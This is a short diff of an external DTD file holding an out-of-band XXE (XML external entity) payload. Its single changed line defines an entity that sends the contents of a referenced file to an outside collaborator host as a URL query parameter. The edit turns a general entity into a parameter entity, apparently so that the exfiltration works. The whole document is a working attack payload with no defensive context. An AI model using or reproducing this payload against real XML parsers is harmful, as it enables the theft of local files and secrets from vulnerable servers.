@@ -1,2 +1,2 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://9hrwo8vvu9ktqeu7t9uw5psw1n7dv2.cigitalcollaborator.com/?collect=%file;'>">
+<!ENTITY % all "<!ENTITY % send SYSTEM 'http://9hrwo8vvu9ktqeu7t9uw5psw1n7dv2.cigitalcollaborator.com/?collect=%file;'>">
 %all;
